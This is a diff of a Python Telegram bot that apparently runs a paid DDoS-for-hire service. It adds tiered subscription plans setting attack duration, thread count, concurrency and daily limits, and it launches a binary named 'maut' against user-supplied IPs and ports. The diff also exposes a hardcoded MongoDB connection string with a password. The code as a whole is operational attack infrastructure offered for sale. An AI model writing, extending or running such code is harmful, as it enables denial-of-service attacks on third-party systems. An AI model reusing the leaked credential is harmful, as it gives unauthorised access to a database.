@@ -26,11 +26,31 @@ MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWr
 ADMIN_IDS = [8167507955]
 OWNER_USERNAME = "seedhe_maut_bot"
 BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-MAX_ATTACK_DURATION = 600  # 10 minutes
-THREADS_COUNT = 950
-COOLDOWN_DURATION = 300  # 10 minutes cooldown
-MAX_CONCURRENT_ATTACKS = 3  # Maximum concurrent attacks per user
-MAX_DAILY_ATTACKS = 10  # Maximum attacks per day per user
+
+# Plan configurations
+PLAN_CONFIG = {
+    1: {
+        'max_duration': 240,  # 5 minutes
+        'threads': 900,
+        'max_concurrent': 3,
+        'max_daily': 10,
+        'cooldown': 300  # 5 minutes
+    },
+    2: {
+        'max_duration': 350,  # 10 minutes
+        'threads': 950,
+        'max_concurrent': 5,
+        'max_daily': 20,
+        'cooldown': 240  # 4 minutes
+    },
+    3: {
+        'max_duration': 600,  # 30 minutes
+        'threads': 950,
+        'max_concurrent': 10,
+        'max_daily': 50,
+        'cooldown': 300  # 3 minutes
+    }
+}
 
 # Initialize MongoDB
 try:
@@ -51,7 +71,6 @@ bot = telebot.TeleBot(TOKEN, threaded=True)
 # Global variables
 user_attack_details = {}
 attack_processes = {}  # Track attack processes by user_id
-user_attack_counts = {}  # Track daily attack counts
 
 def is_user_admin(user_id):
     return user_id in ADMIN_IDS
@@ -76,6 +95,10 @@ def get_user_plan(user_id):
     except Exception as e:
         logger.error(f"Error getting user plan: {e}")
         return 0
+
+def get_plan_config(user_id):
+    plan = get_user_plan(user_id)
+    return PLAN_CONFIG.get(plan, PLAN_CONFIG[1])  # Default to plan 1 if invalid
 
 def check_cooldown(user_id):
     try:
@@ -109,13 +132,17 @@ def get_daily_attack_count(user_id):
 
 def run_attack_command(user_id, target_ip, target_port):
     try:
+        plan_config = get_plan_config(user_id)
+        max_duration = plan_config['max_duration']
+        threads = plan_config['threads']
+        
         # Record the attack start
         attack_id = active_attacks_collection.insert_one({
             "user_id": user_id,
             "target_ip": target_ip,
             "target_port": target_port,
             "started_at": datetime.now(),
-            "ends_at": datetime.now() + timedelta(seconds=MAX_ATTACK_DURATION)
+            "ends_at": datetime.now() + timedelta(seconds=max_duration)
         }).inserted_id
 
         # Log the attack
@@ -124,12 +151,12 @@ def run_attack_command(user_id, target_ip, target_port):
             "target_ip": target_ip,
             "target_port": target_port,
             "started_at": datetime.now(),
-            "duration": MAX_ATTACK_DURATION,
-            "threads": THREADS_COUNT
+            "duration": max_duration,
+            "threads": threads
         })
 
         process = subprocess.Popen(
-            ["./maut", target_ip, str(target_port), str(MAX_ATTACK_DURATION), str(THREADS_COUNT)],
+            ["./maut", target_ip, str(target_port), str(max_duration), str(threads)],
             stdout=subprocess.PIPE, 
             stderr=subprocess.PIPE
         )
@@ -140,7 +167,7 @@ def run_attack_command(user_id, target_ip, target_port):
         
         # Wait for attack to complete or timeout
         try:
-            process.wait(timeout=MAX_ATTACK_DURATION)
+            process.wait(timeout=max_duration)
         except subprocess.TimeoutExpired:
             process.kill()
             logger.info(f"Attack on {target_ip}:{target_port} timed out and was stopped")
@@ -153,7 +180,7 @@ def run_attack_command(user_id, target_ip, target_port):
         # Set cooldown
         cooldowns_collection.update_one(
             {"user_id": user_id},
-            {"$set": {"ends_at": datetime.now() + timedelta(seconds=COOLDOWN_DURATION)}},
+            {"$set": {"ends_at": datetime.now() + timedelta(seconds=plan_config['cooldown'])}},
             upsert=True
         )
         
@@ -258,6 +285,8 @@ def send_help_message(chat_id):
 
 def send_plan_info(chat_id, user_id):
     plan = get_user_plan(user_id)
+    plan_config = get_plan_config(user_id)
+    
     if plan == 0:
         plan_msg = f"""
 📊 *Your Plan: FREE*
@@ -266,7 +295,7 @@ def send_plan_info(chat_id, user_id):
 - Limited attack duration
 - Lower priority
 - No support
-- Max {MAX_DAILY_ATTACKS} attacks per day
+- Max {PLAN_CONFIG[1]['max_daily']} attacks per day
 
 💎 *Upgrade your plan for full features!*
 
@@ -279,10 +308,12 @@ def send_plan_info(chat_id, user_id):
 📊 *Your Plan: PREMIUM (Level {plan})*
 
 🔹 *Benefits:*
-- Full attack duration
-- Highest priority
+- Max Duration: {plan_config['max_duration']//60} minutes
+- Threads: {plan_config['threads']}
+- Concurrent Attacks: {plan_config['max_concurrent']}
+- Daily Attacks: {plan_config['max_daily']}
+- Cooldown: {plan_config['cooldown']//60} minutes
 - Premium support
-- Increased daily attack limit
 
 ⏳ *Valid Until:* {valid_until}
 
@@ -374,14 +405,15 @@ def mystats_command(message):
         cooldown_remaining = check_cooldown(user_id)
         active_attacks = get_active_attack_count(user_id)
         daily_attacks = get_daily_attack_count(user_id)
+        plan_config = get_plan_config(user_id)
         
         stats_msg = f"""
 📈 *Your Statistics*
 
 🔸 *Plan Level:* {user_data.get('plan', 0)}
 🔸 *Total Attacks:* {user_data.get('attack_count', 0)}
-🔸 *Today's Attacks:* {daily_attacks}/{MAX_DAILY_ATTACKS}
-🔸 *Active Attacks:* {active_attacks}/{MAX_CONCURRENT_ATTACKS}
+🔸 *Today's Attacks:* {daily_attacks}/{plan_config['max_daily']}
+🔸 *Active Attacks:* {active_attacks}/{plan_config['max_concurrent']}
 🔸 *Cooldown:* {format_time(cooldown_remaining) if cooldown_remaining > 0 else "Ready"}
 🔸 *Last Attack:* {user_data.get('last_attack', 'Never')}
 🔸 *Account Valid Until:* {user_data.get('valid_until', 'Not specified')}
@@ -409,22 +441,28 @@ def buy_command(message):
 💎 *Available Plans* 💎
 
 1️⃣ *Basic Plan* ($10/month)
-- 10 concurrent attacks
-- 5 minute max duration
+- {PLAN_CONFIG[1]['max_concurrent']} concurrent attacks
+- {PLAN_CONFIG[1]['max_duration']//60} minute max duration
+- {PLAN_CONFIG[1]['threads']} threads
+- {PLAN_CONFIG[1]['max_daily']} daily attacks
+- {PLAN_CONFIG[1]['cooldown']//60} minute cooldown
 - Standard support
-- Increased daily limit
 
 2️⃣ *Pro Plan* ($25/month)
-- 25 concurrent attacks
-- 10 minute max duration
+- {PLAN_CONFIG[2]['max_concurrent']} concurrent attacks
+- {PLAN_CONFIG[2]['max_duration']//60} minute max duration
+- {PLAN_CONFIG[2]['threads']} threads
+- {PLAN_CONFIG[2]['max_daily']} daily attacks
+- {PLAN_CONFIG[2]['cooldown']//60} minute cooldown
 - Priority support
-- Higher daily limit
 
 3️⃣ *VIP Plan* ($50/month)
-- Unlimited attacks
-- 30 minute max duration
+- {PLAN_CONFIG[3]['max_concurrent']} concurrent attacks
+- {PLAN_CONFIG[3]['max_duration']//60} minute max duration
+- {PLAN_CONFIG[3]['threads']} threads
+- {PLAN_CONFIG[3]['max_daily']} daily attacks
+- {PLAN_CONFIG[3]['cooldown']//60} minute cooldown
 - 24/7 dedicated support
-- No daily limit
 
 📌 *Custom plans available*
 
@@ -444,12 +482,14 @@ def attack_command(message):
             bot.send_message(message.chat.id, "🔒 You don't have permission to use this feature!")
             return
 
+        plan_config = get_plan_config(user_id)
+        
         # Check daily attack limit
         daily_attacks = get_daily_attack_count(user_id)
-        if daily_attacks >= MAX_DAILY_ATTACKS:
+        if daily_attacks >= plan_config['max_daily']:
             bot.send_message(
                 message.chat.id,
-                f"⚠️ *Daily attack limit reached* ({daily_attacks}/{MAX_DAILY_ATTACKS})",
+                f"⚠️ *Daily attack limit reached* ({daily_attacks}/{plan_config['max_daily']})",
                 parse_mode='Markdown'
             )
             return
@@ -466,15 +506,15 @@ def attack_command(message):
 
         # Check concurrent attacks
         active_count = get_active_attack_count(user_id)
-        if active_count >= MAX_CONCURRENT_ATTACKS:
+        if active_count >= plan_config['max_concurrent']:
             bot.send_message(
                 message.chat.id,
-                f"⚠️ *Maximum concurrent attacks reached* ({active_count}/{MAX_CONCURRENT_ATTACKS})",
+                f"⚠️ *Maximum concurrent attacks reached* ({active_count}/{plan_config['max_concurrent']})",
                 parse_mode='Markdown'
             )
             return
 
-        msg = bot.send_message(message.chat.id, """
+        msg = bot.send_message(message.chat.id, f"""
 🎯 *Attack Setup*
 
 Please provide the target in this format:
@@ -482,6 +522,10 @@ Please provide the target in this format:
 
 Example:
 `1.1.1.1 80`
+
+Your plan allows:
+- Max duration: {plan_config['max_duration']//60} minutes
+- Threads: {plan_config['threads']}
 """, parse_mode='Markdown')
         bot.register_next_step_handler(msg, process_attack_ip_port)
     except Exception as e:
@@ -519,7 +563,7 @@ def admin_commands(message):
                 users_collection.update_one(
                     {"user_id": target_user_id},
                     {"$set": {
-                        "plan": plan,  # This is the fixed line - now properly sets the plan level
+                        "plan": plan,
                         "valid_until": valid_until,
                         "approved_by": message.from_user.id,
                         "approved_at": datetime.now().isoformat()
@@ -544,7 +588,7 @@ def admin_commands(message):
 🔹 *Plan Level:* {plan}
 🔹 *Valid Until:* {valid_until}
 
-You can now use all bot features.
+You can now use all bot features with your plan limits.
 """, parse_mode='Markdown')
                 except Exception as e:
                     logger.error(f"Could not notify user {target_user_id}: {e}")
@@ -606,12 +650,14 @@ def callback_handler(call):
                 bot.answer_callback_query(call.id, "🔒 You don't have permission to use this feature!", show_alert=True)
                 return
 
+            plan_config = get_plan_config(user_id)
+            
             # Check daily attack limit
             daily_attacks = get_daily_attack_count(user_id)
-            if daily_attacks >= MAX_DAILY_ATTACKS:
+            if daily_attacks >= plan_config['max_daily']:
                 bot.answer_callback_query(
                     call.id,
-                    f"⚠️ Daily attack limit reached ({daily_attacks}/{MAX_DAILY_ATTACKS})",
+                    f"⚠️ Daily attack limit reached ({daily_attacks}/{plan_config['max_daily']})",
                     show_alert=True
                 )
                 return
@@ -628,15 +674,15 @@ def callback_handler(call):
 
             # Check concurrent attacks
             active_count = get_active_attack_count(user_id)
-            if active_count >= MAX_CONCURRENT_ATTACKS:
+            if active_count >= plan_config['max_concurrent']:
                 bot.answer_callback_query(
                     call.id,
-                    f"⚠️ Maximum concurrent attacks reached ({active_count}/{MAX_CONCURRENT_ATTACKS})",
+                    f"⚠️ Maximum concurrent attacks reached ({active_count}/{plan_config['max_concurrent']})",
                     show_alert=True
                 )
                 return
 
-            msg = bot.send_message(call.message.chat.id, """
+            msg = bot.send_message(call.message.chat.id, f"""
 🎯 *Attack Setup*
 
 Please provide the target in this format:
@@ -644,6 +690,10 @@ Please provide the target in this format:
 
 Example:
 `1.1.1.1 80`
+
+Your plan allows:
+- Max duration: {plan_config['max_duration']//60} minutes
+- Threads: {plan_config['threads']}
 """, parse_mode='Markdown')
             bot.register_next_step_handler(msg, process_attack_ip_port)
             bot.answer_callback_query(call.id)
@@ -729,6 +779,7 @@ Example:
                 return
                 
             target_ip, target_port = attack_details
+            plan_config = get_plan_config(user_id)
             
             # Check again in case conditions changed
             cooldown_remaining = check_cooldown(user_id)
@@ -742,19 +793,19 @@ Example:
 
             # Check daily attack limit
             daily_attacks = get_daily_attack_count(user_id)
-            if daily_attacks >= MAX_DAILY_ATTACKS:
+            if daily_attacks >= plan_config['max_daily']:
                 bot.answer_callback_query(
                     call.id,
-                    f"⚠️ Daily attack limit reached ({daily_attacks}/{MAX_DAILY_ATTACKS})",
+                    f"⚠️ Daily attack limit reached ({daily_attacks}/{plan_config['max_daily']})",
                     show_alert=True
                 )
                 return
 
             active_count = get_active_attack_count(user_id)
-            if active_count >= MAX_CONCURRENT_ATTACKS:
+            if active_count >= plan_config['max_concurrent']:
                 bot.answer_callback_query(
                     call.id,
-                    f"⚠️ Maximum concurrent attacks reached ({active_count}/{MAX_CONCURRENT_ATTACKS})",
+                    f"⚠️ Maximum concurrent attacks reached ({active_count}/{plan_config['max_concurrent']})",
                     show_alert=True
                 )
                 return
@@ -782,11 +833,11 @@ Example:
 ✅ *Attack Launched Successfully!*
 
 🔹 *Target:* `{target_ip}:{target_port}`
-🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
-🔹 *Threads:* `{THREADS_COUNT}`
-🔹 *Cooldown:* `10 minutes`
+🔹 *Duration:* `{plan_config['max_duration']//60} minutes`
+🔹 *Threads:* `{plan_config['threads']}`
+🔹 *Cooldown:* `{plan_config['cooldown']//60} minutes`
 
-⚠️ *Attack will automatically stop after {MAX_ATTACK_DURATION//60} minutes*
+⚠️ *Attack will automatically stop after {plan_config['max_duration']//60} minutes*
 """,
                         call.message.chat.id,
                         call.message.message_id,
@@ -872,6 +923,7 @@ def process_attack_ip_port(message):
             return
 
         user_attack_details[user_id] = (target_ip, target_port)
+        plan_config = get_plan_config(user_id)
         
         # Confirm attack details
         confirm_msg = f"""
@@ -879,9 +931,9 @@ def process_attack_ip_port(message):
 
 🔹 *Target IP:* `{target_ip}`
 🔹 *Target Port:* `{target_port}`
-🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
-🔹 *Threads:* `{THREADS_COUNT}`
-🔹 *Cooldown After:* `10 minutes`
+🔹 *Duration:* `{plan_config['max_duration']//60} minutes`
+🔹 *Threads:* `{plan_config['threads']}`
+🔹 *Cooldown After:* `{plan_config['cooldown']//60} minutes`
 
 ⚠️ *Are you sure you want to proceed?*
 """
